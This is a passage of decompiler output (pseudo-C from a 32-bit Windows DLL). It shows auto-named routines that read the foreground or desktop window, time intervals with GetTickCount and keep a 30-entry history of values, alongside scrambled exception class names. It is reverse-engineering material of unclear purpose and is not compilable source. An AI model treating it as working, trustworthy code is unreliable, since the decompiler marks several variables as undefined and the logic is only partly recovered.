  int v37[4]; // [esp+8Ch] [ebp-44h] BYREF
  int v38[10]; // [esp+9Ch] [ebp-34h] BYREF
  int v39; // [esp+CCh] [ebp-4h]

  v2 = (int)this;
  v26 = this;
  sub_1000524E(v32);
  v39 = 0;
  if ( sub_100020A4(v2) && (sub_10015E65() == 13 || !sub_1001597E()) )
  {
    v4 = sub_10002070(v2, v3);
    v5 = *(_BYTE *)(v2 + 4) == 0;
    v31 = v4;
    if ( !v5 )
    {
      v6 = sub_10014B92(v34);
      LOBYTE(v39) = 1;
      v7 = (int *)(*(int (__thiscall **)(_DWORD *, int *))(*v6 + 72))(v6, v25);
      LOBYTE(v39) = 2;
      v8 = sub_1000D426(v7);
      sub_1000CE26(&v27, (int)v8);
      LOBYTE(v39) = 4;
      sub_1000CE59(v25);
      LOBYTE(v39) = 5;
      sub_10001FCC(v34);
      v9 = sub_10014BF7(v25);
      LOBYTE(v39) = 6;
      v10 = sub_1000D426(v9);
      sub_1000CE26(v29, (int)v10);
      LOBYTE(v39) = 8;
      sub_1000CE59(v25);
      v11 = v2 + 140;
      if ( !sub_1000D0B5(v2 + 140, (int)&v27) )
      {
        sub_10003457(0);
        sub_10001AA3((_DWORD *)dword_100BBCC8, v35);
        LOBYTE(v39) = 9;
        v24 = v12;
        v23 = v12;
        v30 = &v23;
        sub_1000CE26(&v23, (int)&v27);
        LOBYTE(v39) = 10;
        v25[0] = (int)&v19;
        sub_10002C48(v36, &v19);
        LOBYTE(v39) = 9;
        if ( !sub_10002122(v19, v20, v21, v22, v23) )
        {
          v24 = v13;
          v23 = v13;
          v25[0] = (int)&v23;
          sub_1000CE26(&v23, (int)v29);
          LOBYTE(v39) = 12;
          v30 = &v19;
          sub_10002C48(v37, &v19);
          LOBYTE(v39) = 9;
          if ( !sub_10002122(v19, v20, v21, v22, v23) )
          {
            v14 = (int)v26;
            v15 = v26 + 34;
            ++v26[34];
            if ( *v15 < *(_DWORD *)(v14 + 132) )
            {
              LOBYTE(v39) = 8;
              sub_10001B27((int)v35);
              LOBYTE(v39) = 5;
              sub_1000CE59(v29);
              LOBYTE(v39) = 0;
              sub_1000CE59(&v27);
              goto LABEL_15;
            }
          }
        }
        LOBYTE(v39) = 8;
        sub_10001B27((int)v35);
        v2 = (int)v26;
      }
      *(_DWORD *)(v2 + 136) = 0;
      sub_10002C25(&v28, (int *)(v11 + 4));
      LOBYTE(v39) = 5;
      sub_1000CE59(v29);
      LOBYTE(v39) = 0;
      sub_1000CE59(&v27);
    }
    sub_10016983(0, (int)v33, 0);
    LOBYTE(v39) = 14;
    sub_10002000((_BYTE *)v2, (int)v31, (int)v33);
    if ( !sub_100020C4((__int32)v33, (_DWORD *)v2, v33) )
    {
      sub_10017D60(v38);
      LOBYTE(v39) = 15;
      sub_10014B37(v32, (int)v38);
      v25[0] = (int)&v20;
      sub_10017EAF(v38, (int)&v20);
      LOBYTE(v39) = 16;
      v16 = *a2;
      LOBYTE(v39) = 15;
      (*(void (__thiscall **)(int *, int, int, int, int, int))(v16 + 76))(a2, v20, v21, v22, v23, v24);
      v25[0] = (int)&v20;
      sub_10016AE9(v33, (int)&v20);
      LOBYTE(v39) = 17;
      v17 = *a2;
      LOBYTE(v39) = 15;
      (*(void (__thiscall **)(int *, int, int, int, int, int))(v17 + 76))(a2, v20, v21, v22, v23, v24);
      *(_DWORD *)(v2 + 8) = GetTickCount();
      LOBYTE(v39) = 14;
      sub_10017DC3((int)v38);
    }
    LOBYTE(v39) = 0;
    sub_10016B53(v33);
  }
LABEL_15:
  v39 = -1;
  return sub_100053D0(v32);
}
// 10001CAF: variable 'v3' is possibly undefined
// 10001D85: variable 'v12' is possibly undefined
// 10001DD6: variable 'v13' is possibly undefined
// 100BBCC8: using guessed type int dword_100BBCC8;
// 10001C4B: using guessed type _DWORD var_94[5];
// 10001C4B: using guessed type int var_6C[3];
// 10001C4B: using guessed type _DWORD var_60[3];
// 10001C4B: using guessed type int var_54[4];
// 10001C4B: using guessed type int var_44[4];
// 10001C4B: using guessed type int var_80[5];
// 10001C4B: using guessed type int var_34[10];

//----- (10001FCC) --------------------------------------------------------
LONG __stdcall sub_10001FCC(int *a1)
{
  return sub_10001B5C(a1);
}

//----- (10002000) --------------------------------------------------------
char __thiscall sub_10002000(_BYTE *this, int a2, int a3)
{
  int v4; // [esp+0h] [ebp-70h] BYREF
  _DWORD v5[21]; // [esp+10h] [ebp-60h] BYREF
  int v6; // [esp+6Ch] [ebp-4h]

  v5[20] = &v4;
  sub_1001509C(v5, a2, (this[4] != 0) + 1);
  v6 = 1;
  sub_10015165((int)v5, a3);
  v6 = -1;
  return sub_10015121(v5);
}

//----- (10002070) --------------------------------------------------------
HWND __usercall sub_10002070@<eax>(int a1@<eax>, int a2@<ecx>)
{
  HWND result; // eax
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = a2;
  if ( *(_BYTE *)(a1 + 4) )
    result = GetForegroundWindow();
  else
    result = GetDesktopWindow();
  if ( !result )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}

//----- (100020A4) --------------------------------------------------------
bool __stdcall sub_100020A4(int a1)
{
  DWORD v1; // esi

  v1 = sub_10015B49();
  return v1 < GetTickCount() - *(_DWORD *)(a1 + 8);
}

//----- (100020C4) --------------------------------------------------------
char __userpurge sub_100020C4@<al>(__int32 a1@<eax>, _DWORD *a2@<edi>, _DWORD *a3)
{
  int v3; // eax
  int v4; // edx
  _DWORD *i; // ecx
  char v7[12]; // [esp+4h] [ebp-Ch] BYREF

  sub_10015CC3(a1, (int)v7);
  v3 = sub_10015CDE(a3, (int)v7);
  v4 = 0;
  for ( i = a2 + 3; v3 != *i; ++i )
  {
    if ( ++v4 >= 30 )
    {
      sub_10002100(a2, v3);
      return 0;
    }
  }
  return 1;
}

//----- (10002100) --------------------------------------------------------
int __thiscall sub_10002100(_DWORD *this, int a2)
{
  int v2; // edx
  _DWORD *v3; // eax
  int result; // eax

  v2 = 29;
  v3 = this + 32;
  do
  {
    *v3 = *(v3 - 1);
    --v2;
    --v3;
  }
  while ( v2 > 0 );
  result = a2;
  this[3] = a2;
  return result;
}

//----- (10002122) --------------------------------------------------------
char __cdecl sub_10002122(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // eax
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  char v9; // bl
  int v11; // [esp-10h] [ebp-38h] BYREF
  int v12; // [esp-Ch] [ebp-34h]
  int v13; // [esp-8h] [ebp-30h] BYREF
  int v14; // [esp-4h] [ebp-2Ch]
  int v15[5]; // [esp+8h] [ebp-20h] BYREF
  int v16; // [esp+24h] [ebp-4h]

  v16 = 1;
  sub_100024C0(&a1, (int)v15);
  LOBYTE(v16) = 2;
  while ( 1 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v15[0] + 4))(v15[0]) )
    {
      v9 = 0;
      goto LABEL_7;
    }
    v14 = v8;
    v13 = v8;
    v15[3] = (int)&v13;
    sub_10012A7C(&v13, (int)&a5);
    LOBYTE(v16) = 3;
    v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v15[0] + 12))(v15[0]);
    v12 = v6;
    v11 = v6;
    v15[2] = (int)&v11;
    sub_10012A7C(&v11, v5);
    LOBYTE(v16) = 2;
    if ( sub_10017AE1(v11, v12, v13, v14) )
      break;
    sub_100021E3(v7, v15[0]);
  }
  v9 = 1;
LABEL_7:
  LOBYTE(v16) = 1;
  sub_1000323B(v15);
  LOBYTE(v16) = 0;
  sub_10002CF0(&a1);
  v16 = -1;
  sub_1000CE59(&a5);
  return v9;
}
// 1000214A: variable 'v8' is possibly undefined
// 10002167: variable 'v6' is possibly undefined
// 1000218C: variable 'v7' is possibly undefined

//----- (100021E3) --------------------------------------------------------
int __usercall sub_100021E3@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10002214) --------------------------------------------------------
_DWORD *__thiscall sub_10002214(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100028F0(this, v3, 0);
  else
    v4 = 0;
  sub_1000328E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10002271) --------------------------------------------------------
_DWORD *__thiscall sub_10002271(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10002A60(this, v3, 0);
  else
    v4 = 0;
  sub_100031F7(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100022CE) --------------------------------------------------------
_DWORD *__thiscall sub_100022CE(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100028F0(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1000328E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10002333) --------------------------------------------------------
_DWORD *__thiscall sub_10002333(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10002A60(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100031F7(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10002398) --------------------------------------------------------
_DWORD *__thiscall sub_10002398(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100028F0(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1000328E(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10002417) --------------------------------------------------------
_DWORD *__thiscall sub_10002417(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10002A60(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100031F7(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10002496) --------------------------------------------------------
void *__thiscall sub_10002496(_DWORD *this)
{
  void *result; // eax

  result = &loc_10078CAA;
  *this = &off_10092FB4;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10092FB4: using guessed type int (__thiscall *off_10092FB4)(void *Block, char);

//----- (100024C0) --------------------------------------------------------
int __thiscall sub_100024C0(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (100024F3) --------------------------------------------------------
int *__thiscall sub_100024F3(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100028B5(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000254B: variable 'v5' is possibly undefined

//----- (10002566) --------------------------------------------------------
int *__thiscall sub_10002566(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100021E3(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100025BE: variable 'v5' is possibly undefined

//----- (100025D9) --------------------------------------------------------
void __thiscall sub_100025D9(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_100032D2(v2);
}

//----- (10002617) --------------------------------------------------------
void __thiscall sub_10002617(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_100032D2(v3);
}

//----- (10002658) --------------------------------------------------------
void __thiscall sub_10002658(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_100032D2(v2);
}

//----- (10002696) --------------------------------------------------------
int __thiscall sub_10002696(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000323B(v4);
  return v2;
}

//----- (100026DA) --------------------------------------------------------
int __thiscall sub_100026DA(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100032D2(v4);
  return v2;
}

//----- (1000271E) --------------------------------------------------------
void __thiscall sub_1000271E(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_100032D2(v1);
}

//----- (1000276C) --------------------------------------------------------
void *__thiscall sub_1000276C(_DWORD *this)
{
  void *result; // eax
  void *v2; // esi
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = &loc_1007BA63;
  v3[3] = v3;
  *this = off_1009300C;
  v3[6] = 0;
  v2 = (void *)this[1];
  if ( v2 )
    return sub_1000285A(v2);
  return result;
}
// 1009300C: using guessed type int (__thiscall *off_1009300C[2])(void *Block, char);

//----- (100027B0) --------------------------------------------------------
_DWORD *__thiscall sub_100027B0(_DWORD *this, int a2)
{
  sub_10016406(this, a2);
  *this = &off_10092F18;
  return this;
}
// 10092F18: using guessed type int (__thiscall *off_10092F18)(void *Block, char);

//----- (10002805) --------------------------------------------------------
_DWORD *__thiscall sub_10002805(_DWORD *Block, char a2)
{
  sub_10002496(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000283E) --------------------------------------------------------
_DWORD *__thiscall sub_1000283E(_DWORD *Block, char a2)
{
  sub_1000276C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000285A) --------------------------------------------------------
void *__usercall sub_1000285A@<eax>(void *a1@<esi>)
{
  int v2; // [esp+0h] [ebp-4h]

  sub_10002886(v2);
  j__free(a1);
  return a1;
}
// 1000285B: variable 'v2' is possibly undefined

//----- (1000286A) --------------------------------------------------------
_DWORD *__thiscall sub_1000286A(_DWORD *Block, char a2)
{
  sub_100166BD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10002886) --------------------------------------------------------
void *__stdcall sub_10002886(int a1)
{
  return sub_10001B27(a1);
}

//----- (100028B5) --------------------------------------------------------
int __usercall sub_100028B5@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100028F0) --------------------------------------------------------
_DWORD *__thiscall sub_100028F0(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10092FEC;
  a2[1] = this;
  *a2 = &off_10093010;
  a2[2] = a3;
  return result;
}
// 10092FEC: using guessed type int (__thiscall *off_10092FEC)(void *Block, char);
// 10093010: using guessed type int (__thiscall *off_10093010)(void *Block, char);

//----- (10002928) --------------------------------------------------------
void *__thiscall sub_10002928(_DWORD *this)
{
  void *result; // eax

  result = &loc_10078BF7;
  *this = &off_10093010;
  *this = &off_10092FEC;
  return result;
}
// 10092FEC: using guessed type int (__thiscall *off_10092FEC)(void *Block, char);
// 10093010: using guessed type int (__thiscall *off_10093010)(void *Block, char);

//----- (10002952) --------------------------------------------------------
bool __thiscall sub_10002952(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10002969) --------------------------------------------------------
BOOL __thiscall sub_10002969(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10002973) --------------------------------------------------------
int __thiscall sub_10002973(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (100029AE) --------------------------------------------------------
int __thiscall sub_100029AE(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100029E4) --------------------------------------------------------
int __thiscall sub_100029E4(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10002A0C) --------------------------------------------------------
int __thiscall sub_10002A0C(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10002A47) --------------------------------------------------------
int __thiscall sub_10002A47(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10002A60) --------------------------------------------------------
_DWORD *__thiscall sub_10002A60(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10092F94;
  a2[1] = this;
  *a2 = &off_10093030;
  a2[2] = a3;
  return result;
}
// 10092F94: using guessed type int (__thiscall *off_10092F94)(void *Block, char);
// 10093030: using guessed type int (__thiscall *off_10093030)(void *Block, char);

//----- (10002A98) --------------------------------------------------------
void *__thiscall sub_10002A98(_DWORD *this)
{
  void *result; // eax

  result = &loc_10078BD3;
  *this = &off_10093030;
  *this = &off_10092F94;
  return result;
}
// 10092F94: using guessed type int (__thiscall *off_10092F94)(void *Block, char);
// 10093030: using guessed type int (__thiscall *off_10093030)(void *Block, char);

//----- (10002AC2) --------------------------------------------------------
bool __thiscall sub_10002AC2(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10002AD9) --------------------------------------------------------
BOOL __thiscall sub_10002AD9(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10002AE3) --------------------------------------------------------
int __thiscall sub_10002AE3(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10002B1E) --------------------------------------------------------
int __thiscall sub_10002B1E(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10002B54) --------------------------------------------------------
int __thiscall sub_10002B54(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10002B7C) --------------------------------------------------------
int __thiscall sub_10002B7C(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10002BB7) --------------------------------------------------------
int __thiscall sub_10002BB7(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10002BD0) --------------------------------------------------------
_DWORD *__thiscall sub_10002BD0(_DWORD *Block, char a2)
{
  sub_10002928(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10002BEC) --------------------------------------------------------
_DWORD *__thiscall sub_10002BEC(_DWORD *Block, char a2)
{
  sub_10002A98(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10002C25) --------------------------------------------------------
int *__usercall sub_10002C25@<eax>(int *a1@<eax>, int *a2@<edi>)
{
  int v2; // eax
  int v3; // ebx

  v2 = *a1;
  v3 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_10003386(a2);
    if ( v3 )
      sub_10016377(v3);
  }
  return a2;
}

//----- (10002C48) --------------------------------------------------------
_DWORD *__userpurge sub_10002C48@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  void *v5; // [esp-4h] [ebp-14h]

  sub_10003357(a2);
  *a2 = &off_10092F38;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10002FF9(a2, v2, v4, v5);
  return a2;
}
// 10092F38: using guessed type int (__thiscall *off_10092F38)(void *Block, char);

//----- (10002C9C) --------------------------------------------------------
int *__thiscall sub_10002C9C(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10002CF0) --------------------------------------------------------
void *__thiscall sub_10002CF0(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_10092F38;
  v5 = 1;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  v5 = -1;
  return sub_10002496(this);
}
// 10092F38: using guessed type int (__thiscall *off_10092F38)(void *Block, char);

//----- (10002D62) --------------------------------------------------------
int __thiscall sub_10002D62(_DWORD *this)
{
  return this[1];
}

//----- (10002D66) --------------------------------------------------------
int *__thiscall sub_10002D66(_DWORD *this, int a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B870F);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
